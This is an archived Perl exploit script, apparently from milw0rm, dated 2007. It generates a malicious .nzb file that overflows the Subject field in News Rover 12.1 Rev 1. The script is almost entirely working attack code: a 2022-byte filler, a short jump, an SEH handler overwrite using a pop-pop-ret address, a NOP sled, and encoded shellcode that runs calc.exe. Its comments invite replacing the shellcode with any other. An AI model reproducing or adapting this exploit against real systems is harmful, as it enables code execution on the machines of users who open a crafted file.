<html><head><title>News Rover 12.1 Rev 1 Remote Stack Overflow Exploit (perl)</title></head><pre>#!/usr/bin/perl
# ===============================================================================================
#                News Rover 12.1 Rev 1 Remote Stack Overflow perl exploit 
#                               By Umesh Wanve (umesh_345@yahoo.com)
# ==============================================================================================          
# Credits : Originally discovered and coded in c by Marsu &lt;MarsupilamiPowa@hotmail.fr&gt;
#
# Reference : http://www.securityfocus.com/bid/22618
#
# Date : 24-02-2007
#
# This is converted into perl for perl lovers.
# Tested on Windows 2000 SP4 Server English
#           Windows 2000 SP4 Professional English
#
# You can replace shellcode with your favourite one :)
#
# 
# Buffer overflow exists in Subject parameter of the .nzb file
# By Passing more than 2022 bytes we can able to overwrite SEH handler
# So here you go.
# Buffer =    Buffer        +  Short Jmp to Hellcode (Pointer to NEXT SEH Handler) + SEH HANDLER +  NOP SLED + Shellcode
#         &lt;-2022 Bytes -&gt;   &lt;---------------4 Byte-------------------------------&gt;   &lt; 4 Byte &gt;   + &lt;-15 bytes-&gt;
#
# USE 0x750211a9 Universal address found on Metasploit. Thanks to them
# Just change to anything you want.
#
# This was written as a fun. Use it at your own risk.
#
# Special thanks to Marsu (bug discover and exploit coded in c by him). :)
# Also thanks to Metasploit for there great Opcode database.
#
#================================================================================================

use strict;

my($buffer)=(&quot;A&quot; x 2022);               #buffer upto SEH structure

my($Short_jmp)=&quot;\xeb\x15\x90\x90&quot;;      #short jmp to hellcode

my($SEH_handler)=&quot;\xa9\x11\x02\x75&quot;;  #pop, pop, ret in WS2HELP.DLL in WIN 2000 SP4 
						  # Universal Address :)
						  #Change according to your need

my($nop)=&quot;\x90\x90\x90\x90\x90&quot;.
         &quot;\x90\x90\x90\x90\x90&quot;.
	   &quot;\x90\x90\x90\x90\x90&quot;;      #NOP sled to land into hellcode

# win32_exec - EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com 
my($hell_calc)=
&quot;\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa4&quot;.
&quot;\xb2\x82\x70\x83\xeb\xfc\xe2\xf4\x58\x5a\xc6\x70\xa4\xb2\x09\x35&quot;.
&quot;\x98\x39\xfe\x75\xdc\xb3\x6d\xfb\xeb\xaa\x09\x2f\x84\xb3\x69\x39&quot;.
&quot;\x2f\x86\x09\x71\x4a\x83\x42\xe9\x08\x36\x42\x04\xa3\x73\x48\x7d&quot;.
&quot;\xa5\x70\x69\x84\x9f\xe6\xa6\x74\xd1\x57\x09\x2f\x80\xb3\x69\x16&quot;.
&quot;\x2f\xbe\xc9\xfb\xfb\xae\x83\x9b\x2f\xae\x09\x71\x4f\x3b\xde\x54&quot;.
&quot;\xa0\x71\xb3\xb0\xc0\x39\xc2\x40\x21\x72\xfa\x7c\x2f\xf2\x8e\xfb&quot;.
&quot;\xd4\xae\x2f\xfb\xcc\xba\x69\x79\x2f\x32\x32\x70\xa4\xb2\x09\x18&quot;.
&quot;\x98\xed\xb3\x86\xc4\xe4\x0b\x88\x27\x72\xf9\x20\xcc\x42\x08\x74&quot;.
&quot;\xfb\xda\x1a\x8e\x2e\xbc\xd5\x8f\x43\xd1\xe3\x1c\xc7\x9c\xe7\x08&quot;.
&quot;\xc1\xb2\x82\x70&quot;;


my($file_header)=&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;iso-8859-1\&quot; ?&gt;\n&quot;.
			&quot;&lt;!DOCTYPE nzb PUBLIC \&quot;-//newzBin//DTD NZB 1.0//EN\&quot; \&quot;http://www.newzbin.com/DTD/nzb/nzb-1.0.dtd\&quot;&gt;\n&quot;.
			&quot;&lt;!-- NZB Generated by Umesh Wanve --&gt;\n&quot;.
			&quot;&lt;nzb xmlns=\&quot;http://www.google.com\&quot;&gt;\n\n&quot;;

my($file_end)=&quot;&lt;/segment&gt;\n&quot;.
&quot;&lt;/segments&gt;\n&quot;.
&quot;&lt;/file&gt;\n&quot;.
&quot;&lt;/nzb&gt;\n&quot;;


open(OUTPUTFILE, &quot;&gt;poc.nzb&quot;);                        # Crafted .NZB file 
 
print OUTPUTFILE $file_header;                       # Writing Header

print OUTPUTFILE &quot;&lt;file poster=\&quot;Poster\&quot; date=\&quot;1170609233\&quot;\nsubject=\&quot;&quot;;    # Vulnerable SUBJECT parameter

print OUTPUTFILE $buffer;                           # buffer =A x 2022
print OUTPUTFILE $Short_jmp;                        #short jump \xEB\x15\x90\x90
print OUTPUTFILE $SEH_handler;                      #pop pop ret in    WS2HELP.DLL in WIN 2000 SP4
print OUTPUTFILE $nop;                              #nop sled to jump into shellcode
print OUTPUTFILE $hell_calc;                        #the hell code

print OUTPUTFILE &quot;\&quot;&gt;\n&lt;groups&gt;&lt;group&gt;some group&lt;/group&gt;&lt;/groups&gt;\n&lt;segments&gt;\n&lt;segment bytes=\&quot;30\&quot; number=\&quot;1\&quot;&gt;some name&quot;;
print OUTPUTFILE $file_end;                                     # End of file


close(OUTFILE);


# ==========================================

# milw0rm.com [2007-02-24]</pre></html>